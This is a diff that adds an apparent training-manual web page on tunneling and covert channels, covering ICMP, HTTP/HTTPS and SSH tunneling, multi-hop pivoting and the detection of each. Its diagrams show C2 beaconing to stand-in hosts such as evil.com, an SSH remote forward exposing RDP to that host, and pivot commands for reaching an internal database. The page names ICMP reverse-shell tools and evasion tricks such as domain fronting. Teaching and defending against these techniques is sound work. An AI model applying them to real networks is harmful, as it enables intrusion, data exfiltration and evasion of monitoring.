@@ -1,0 +1,539 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description"
+        content="Section 2.7: Tunneling and Covert Channels - Coverage of ICMP, DNS, HTTP tunneling, SSH pivoting, and protocol encapsulation for evasion.">
+    <title>2.7 TUNNELING ATTACKS | MODULE 2 | FIELD MANUAL</title>
+    <link rel="stylesheet" href="../styles.css">
+</head>
+
+<body>
+    <div class="classification-banner">
+        UNCLASSIFIED // MODULE 2 // SECTION 2.7 // TUNNELING ATTACKS
+    </div>
+
+    <header class="site-header">
+        <h1 class="site-title">Section 2.7</h1>
+        <p class="site-subtitle">Tunneling and Covert Channels</p>
+    </header>
+
+    <nav class="nav-main">
+        <ul class="nav-list">
+            <li><a href="../index.html" class="nav-link">HOME</a></li>
+            <li><a href="index.html" class="nav-link">MODULE 2</a></li>
+            <li><a href="dns-attacks.html" class="nav-link">PREV: DNS ATTACKS</a></li>
+            <li><a href="dos-attacks.html" class="nav-link">NEXT: DoS ATTACKS</a></li>
+        </ul>
+    </nav>
+
+    <main class="container">
+        <div class="content-wrapper">
+            <nav class="breadcrumb">
+                <a href="../index.html">Home</a>
+                <span class="breadcrumb-separator">/</span>
+                <a href="index.html">Module 2</a>
+                <span class="breadcrumb-separator">/</span>
+                <span>2.7 Tunneling Attacks</span>
+            </nav>
+
+            <p class="section-marker">// SECTION 2.7</p>
+            <h1>Tunneling and Covert Channels</h1>
+
+            <!-- ============================================
+                 INTRODUCTION
+                 ============================================ -->
+            <h2>Overview</h2>
+
+            <p>
+                <strong>Tunneling</strong> encapsulates one protocol within another, enabling
+                communication channels that bypass network restrictions. Attackers use tunneling
+                to exfiltrate data, maintain command-and-control connections, and pivot through
+                compromised networks while evading detection.
+            </p>
+
+            <p>
+                <strong>Covert channels</strong> are communication paths not intended for data
+                transfer, exploiting protocol fields, timing, or other mechanisms to hide
+                communications within legitimate traffic.
+            </p>
+
+            <div class="definition-block">
+                <div class="definition-term">Protocol Tunneling</div>
+                <div class="definition-desc">
+                    The technique of encapsulating one network protocol within another protocol's
+                    payload, enabling the encapsulated protocol to traverse networks that would
+                    otherwise block it.
+                </div>
+            </div>
+
+            <!-- ============================================
+                 ICMP TUNNELING
+                 ============================================ -->
+            <h2>ICMP Tunneling</h2>
+
+            <p>
+                <strong>ICMP tunneling</strong> encodes data within ICMP Echo Request/Reply packets
+                (ping). Many firewalls permit ICMP for network diagnostics, creating an opportunity
+                for covert data transfer.
+            </p>
+
+            <div class="diagram">
+                ICMP TUNNELING:
+
+                NORMAL PING:
+                +-----------------------------------------------+
+                | IP Header | ICMP Header | Identifier | Seq |
+                | ... | Type: 8 | 1234 | 1 |
+                | | (Echo Req) | | |
+                +-----------------------------------------------+
+                | Data: "AAAAAAAA..." (arbitrary padding) |
+                +-----------------------------------------------+
+
+                TUNNELED DATA:
+                +-----------------------------------------------+
+                | IP Header | ICMP Header | Identifier | Seq |
+                | ... | Type: 8 | 1234 | 1 |
+                +-----------------------------------------------+
+                | Data: <ENCAPSULATED TCP/UDP PAYLOAD> |
+                    | "GET /commands HTTP/1.1\r\nHost: c2.evil..." |
+                    +-----------------------------------------------+
+
+                    OPERATION FLOW:
+
+                    COMPROMISED FIREWALL TUNNEL SERVER
+                    HOST (ICMP allowed) (INTERNET)
+                    | | |
+                    |---[ICMP Echo Request]---->|------------------->|
+                    | Data: "cmd=beacon" | |
+                    | | |
+                    |<--[ICMP Echo Reply]-------|<--------------------| | Data: "exec whoami" | | | | | TOOLS: -
+                        icmptunnel - ptunnel (Ping Tunnel) - icmpsh (ICMP reverse shell) - hans (IP over ICMP) </div>
+
+                        <div class="technical-block">
+                            <div class="technical-block-title">ICMP Tunnel Characteristics</div>
+                            <table>
+                                <thead>
+                                    <tr>
+                                        <th>Aspect</th>
+                                        <th>Value</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <tr>
+                                        <td>Protocol</td>
+                                        <td>ICMP Type 8/0 (Echo Request/Reply)</td>
+                                    </tr>
+                                    <tr>
+                                        <td>Payload Size</td>
+                                        <td>Up to ~64KB (practical: 1400 bytes)</td>
+                                    </tr>
+                                    <tr>
+                                        <td>Bandwidth</td>
+                                        <td>Low (~10-100 KB/s)</td>
+                                    </tr>
+                                    <tr>
+                                        <td>Reliability</td>
+                                        <td>Unreliable (no retransmission)</td>
+                                    </tr>
+                                    <tr>
+                                        <td>Detection</td>
+                                        <td>Payload size, frequency, content analysis</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+
+                        <!-- ============================================
+                 HTTP/HTTPS TUNNELING
+                 ============================================ -->
+                        <h2>HTTP/HTTPS Tunneling</h2>
+
+                        <p>
+                            <strong>HTTP tunneling</strong> encapsulates traffic within HTTP requests and
+                            responses. Since HTTP/HTTPS is almost universally permitted, this provides
+                            reliable egress from restricted networks. HTTPS adds encryption, preventing
+                            content inspection.
+                        </p>
+
+                        <div class="diagram">
+                            HTTP TUNNELING:
+
+                            METHOD 1: HTTP CONNECT (Proxy Tunneling)
+
+                            CLIENT PROXY TARGET
+                            | | |
+                            |---[CONNECT target:443]-->| |
+                            | HTTP/1.1 | |
+                            | |---[TCP Connect]-------->|
+                            | |<--[Connected]-----------| |<--[200 OK]---------------| | | | | |===[RAW TCP
+                                TUNNEL]=======|========================>|
+                                | (Any protocol) | |
+                                | | |
+
+                                METHOD 2: HTTP Encapsulation
+
+                                CLIENT C2 SERVER
+                                | |
+                                |---[GET /beacon?data=base64encodeddata]---------->|
+                                | User-Agent: Mozilla/5.0... |
+                                | Cookie: session=<encoded_data> |
+                                    | |
+                                    |<--[HTTP 200 OK]----------------------------------| | Content-Type: image/png | |
+                                        <PNG Header>
+                                        <Commands encoded in pixels> |
+                                            | |
+
+                                            METHOD 3: WebSocket Tunnel
+
+                                            |---[Upgrade: websocket]-------------------------->|
+                                            |<--[101 Switching Protocols]----------------------| | | |<==[Full-duplex
+                                                binary channel]==================>|
+                                                | |
+                        </div>
+
+                        <h3>HTTPS for Encryption</h3>
+
+                        <div class="diagram">
+                            HTTPS TUNNEL INSPECTION CHALLENGES:
+
+                            WITHOUT TLS INSPECTION:
+
+                            CLIENT FIREWALL C2 SERVER
+                            | | |
+                            |---[TLS ClientHello]------>|------------------------->|
+                            |<--[TLS ServerHello]-------|<-------------------------| |<==[ENCRYPTED
+                                TUNNEL]======|=========================>|
+                                | | |
+                                | Firewall sees only: | |
+                                | - Destination IP | |
+                                | - SNI (server name) | |
+                                | - Certificate | |
+                                | CANNOT see content! | |
+                                | | |
+
+                                TLS INSPECTION (SSL Proxy):
+
+                                CLIENT SSL PROXY C2 SERVER
+                                | | |
+                                |<===[TLS to Proxy]======>|<===[TLS to Server]===>|
+                                        | Proxy's cert | Real cert |
+                                        | | |
+                                        | Proxy decrypts, | |
+                                        | inspects, re-encrypts | |
+                                        | | |
+
+                                        EVASION:
+                                        - Domain fronting (use CDN to hide true destination)
+                                        - Certificate pinning detection
+                                        - Custom TLS implementations
+                        </div>
+
+                        <!-- ============================================
+                 SSH TUNNELING
+                 ============================================ -->
+                        <h2>SSH Tunneling and Pivoting</h2>
+
+                        <p>
+                            <strong>SSH tunneling</strong> creates encrypted channels through SSH connections,
+                            enabling port forwarding, SOCKS proxying, and network pivoting. SSH is a trusted
+                            protocol in most environments, making it ideal for post-exploitation.
+                        </p>
+
+                        <h3>Local Port Forwarding</h3>
+
+                        <div class="diagram">
+                            SSH LOCAL PORT FORWARDING:
+
+                            Syntax: ssh -L [local_port]:[target]:[target_port] [ssh_server]
+
+                            SCENARIO: Access internal web server (10.0.0.5:80) via jump host
+
+                            ATTACKER JUMP HOST INTERNAL
+                            (Kali) (Compromised) SERVER
+                            192.168.1.10 10.0.0.1 10.0.0.5:80
+                            | | |
+                            |---[SSH to 10.0.0.1]----->| |
+                            | -L 8080:10.0.0.5:80 | |
+                            | | |
+
+                            After tunnel established:
+
+                            | | |
+                            |---[localhost:8080] | |
+                            | | |---[10.0.0.5:80]-------->|
+                            | | |<--[HTTP Response]-------| |<---------+ | | | | | RESULT: Attacker accesses
+                                http://localhost:8080 Traffic tunneled through jump host to internal server </div>
+
+                                <h3>Remote Port Forwarding</h3>
+
+                                <div class="diagram">
+                                    SSH REMOTE PORT FORWARDING:
+
+                                    Syntax: ssh -R [remote_port]:[target]:[target_port] [ssh_server]
+
+                                    SCENARIO: Expose internal service to attacker's server
+
+                                    INTERNAL ATTACKER ATTACKER
+                                    HOST SSH SERVER CLIENT
+                                    (Compromised) (C2)
+                                    10.0.0.5 evil.com
+                                    | | |
+                                    |---[SSH to evil.com]----->| |
+                                    | -R 8080:localhost:3389 | |
+                                    | (Expose RDP) | |
+                                    | | |
+
+                                    After tunnel established:
+
+                                    | | |
+                                    | |<--[evil.com:8080]-------| |<--[RDP traffic]----------| | |---[RDP
+                                        response]-------->|------------------------>|
+                                        | | |
+
+                                        RESULT:
+                                        Attacker connects to evil.com:8080
+                                        Gets RDP access to internal host
+                                        Bypasses inbound firewall rules
+                                </div>
+
+                                <h3>Dynamic Port Forwarding (SOCKS Proxy)</h3>
+
+                                <div class="diagram">
+                                    SSH DYNAMIC PORT FORWARDING:
+
+                                    Syntax: ssh -D [local_port] [ssh_server]
+
+                                    SCENARIO: Use compromised host as SOCKS proxy
+
+                                    ATTACKER COMPROMISED ANY INTERNAL
+                                    (Kali) HOST TARGET
+                                    | | |
+                                    |---[SSH -D 1080]--------->| |
+                                    | | |
+
+                                    SOCKS proxy on localhost:1080
+
+                                    Configure browser/tool to use SOCKS5 proxy:
+
+                                    |---[SOCKS: 10.0.0.5:80]-->|---[HTTP]--------------->|
+                                    |---[SOCKS: 10.0.0.6:22]-->|---[SSH]---------------->|
+                                    |---[SOCKS: 10.0.0.7:445]->|---[SMB]---------------->|
+                                    | | |
+
+                                    RESULT:
+                                    Single SSH connection
+                                    Access ANY internal host/port via SOCKS
+                                    Use with proxychains for CLI tools
+                                </div>
+
+                                <h3>SSH Pivoting Chains</h3>
+
+                                <div class="diagram">
+                                    MULTI-HOP PIVOTING:
+
+                                    ATTACKER HOST A HOST B TARGET
+                                    (Internet) (DMZ) (Internal) (DB Server)
+                                    | | | |
+                                    |---[SSH]------->| | |
+                                    | Port 22 | | |
+                                    | |---[SSH Tunnel]----->| |
+                                    | | (via PT fwd) | |
+                                    | | |---[TCP 3306]------->|
+                                    | | | (MySQL) |
+                                    | | | |
+
+                                    COMMAND CHAIN:
+                                    1. ssh -L 2222:10.0.1.5:22 user@hostA
+                                    2. ssh -L 3306:10.0.2.10:3306 -p 2222 user@localhost
+                                    3. mysql -h localhost -P 3306
+
+                                    RESULT:
+                                    Attacker connects to localhost:3306
+                                    Traffic routes: Attacker -> Host A -> Host B -> DB Server
+                                </div>
+
+                                <!-- ============================================
+                 COVERT CHANNELS
+                 ============================================ -->
+                                <h2>Covert Channels</h2>
+
+                                <p>
+                                    <strong>Covert channels</strong> encode data in unexpected protocol fields or
+                                    behaviors. These channels are designed for stealth rather than bandwidth.
+                                </p>
+
+                                <div class="diagram">
+                                    COVERT CHANNEL TYPES:
+
+                                    1. STORAGE CHANNELS (Data hidden in fields)
+
+                                    IP HEADER:
+                                    +-------+-------+-------+-------+
+                                    | ID | Flags | TTL | Proto |
+                                    |<DATA> | <-----|-------|------>|
+                                            +-------+-------+-------+-------+
+
+                                            - IP Identification field (16 bits)
+                                            - IP Options field
+                                            - TCP Urgent Pointer
+                                            - TCP Options
+                                            - HTTP headers (X-Custom-Header)
+
+                                            2. TIMING CHANNELS (Data in timing patterns)
+
+                                            Bit = 0: Send packet at T
+                                            Bit = 1: Send packet at T + delay
+
+                                            |----[Packet]--delay--[Packet]--[Packet]--delay--|
+                                            0 1 1 0
+
+                                            3. PROTOCOL FIELD MANIPULATION
+
+                                            ICMP:
+                                            - Sequence number encodes data
+                                            - Identifier encodes data
+                                            - Timestamp manipulation
+
+                                            TCP:
+                                            - Initial Sequence Number (ISN)
+                                            - Timestamp options
+                                            - Window size modulation
+
+                                            DNS:
+                                            - Query name encoding (see DNS tunneling)
+                                            - TXT record responses
+                                </div>
+
+                                <div class="technical-block">
+                                    <div class="technical-block-title">Covert Channel Examples</div>
+                                    <table>
+                                        <thead>
+                                            <tr>
+                                                <th>Protocol</th>
+                                                <th>Field</th>
+                                                <th>Capacity</th>
+                                            </tr>
+                                        </thead>
+                                        <tbody>
+                                            <tr>
+                                                <td>IP</td>
+                                                <td>Identification</td>
+                                                <td>16 bits/packet</td>
+                                            </tr>
+                                            <tr>
+                                                <td>TCP</td>
+                                                <td>ISN (initial)</td>
+                                                <td>32 bits/connection</td>
+                                            </tr>
+                                            <tr>
+                                                <td>TCP</td>
+                                                <td>Urgent Pointer</td>
+                                                <td>16 bits/packet</td>
+                                            </tr>
+                                            <tr>
+                                                <td>ICMP</td>
+                                                <td>Seq + ID</td>
+                                                <td>32 bits/packet</td>
+                                            </tr>
+                                            <tr>
+                                                <td>HTTP</td>
+                                                <td>Custom Headers</td>
+                                                <td>Variable</td>
+                                            </tr>
+                                        </tbody>
+                                    </table>
+                                </div>
+
+                                <!-- ============================================
+                 DETECTION
+                 ============================================ -->
+                                <h2>Detection and Defense</h2>
+
+                                <table>
+                                    <thead>
+                                        <tr>
+                                            <th>Tunnel Type</th>
+                                            <th>Detection Indicators</th>
+                                            <th>Mitigation</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody>
+                                        <tr>
+                                            <td>ICMP</td>
+                                            <td>Large payload, high frequency, binary content</td>
+                                            <td>Block ICMP or limit payload size</td>
+                                        </tr>
+                                        <tr>
+                                            <td>DNS</td>
+                                            <td>Long queries, high entropy, TXT volume</td>
+                                            <td>DNS inspection, internal resolvers only</td>
+                                        </tr>
+                                        <tr>
+                                            <td>HTTP</td>
+                                            <td>Beaconing patterns, unusual URIs</td>
+                                            <td>SSL inspection, behavior analysis</td>
+                                        </tr>
+                                        <tr>
+                                            <td>SSH</td>
+                                            <td>Long sessions, unusual destinations</td>
+                                            <td>Whitelist SSH destinations, monitor</td>
+                                        </tr>
+                                        <tr>
+                                            <td>Covert</td>
+                                            <td>Protocol anomalies, statistical analysis</td>
+                                            <td>Deep packet inspection, normalization</td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+
+                                <!-- ============================================
+                 SECTION SUMMARY
+                 ============================================ -->
+                                <h2>Section Summary</h2>
+
+                                <p>
+                                    This section covered tunneling and covert channel techniques:
+                                </p>
+
+                                <ul>
+                                    <li>ICMP tunneling: data in ping packets</li>
+                                    <li>HTTP/HTTPS tunneling: web-based covert channels</li>
+                                    <li>SSH tunneling: local, remote, and dynamic port forwarding</li>
+                                    <li>Pivoting: multi-hop access through compromised hosts</li>
+                                    <li>Covert channels: storage and timing-based hidden communication</li>
+                                </ul>
+
+                                <div class="technical-block">
+                                    <div class="technical-block-title">Key Takeaways</div>
+                                    <ul>
+                                        <li>Tunneling exploits permitted protocols to bypass restrictions</li>
+                                        <li>HTTPS tunneling is difficult to detect without SSL inspection</li>
+                                        <li>SSH provides versatile pivoting capabilities</li>
+                                        <li>Covert channels trade bandwidth for stealth</li>
+                                        <li>Detection requires protocol-aware deep inspection</li>
+                                    </ul>
+                                </div>
+
+                                <h2>Navigation</h2>
+                                <p>
+                                    <a href="dns-attacks.html" class="nav-link" style="display: inline-block;">RETURN TO
+                                        SECTION 2.6</a>
+                                    <span style="margin: 0 1rem; color: var(--text-muted);">|</span>
+                                    <a href="dos-attacks.html" class="nav-link" style="display: inline-block;">PROCEED
+                                        TO SECTION 2.8: DoS ATTACKS</a>
+                                </p>
+                        </div>
+    </main>
+
+    <footer class="site-footer">
+        <p class="footer-text">
+            Section 2.7: Tunneling Attacks // Module 2 // Field Manual<br>
+            Classification: Unclassified
+        </p>
+    </footer>
+</body>
+
+</html>
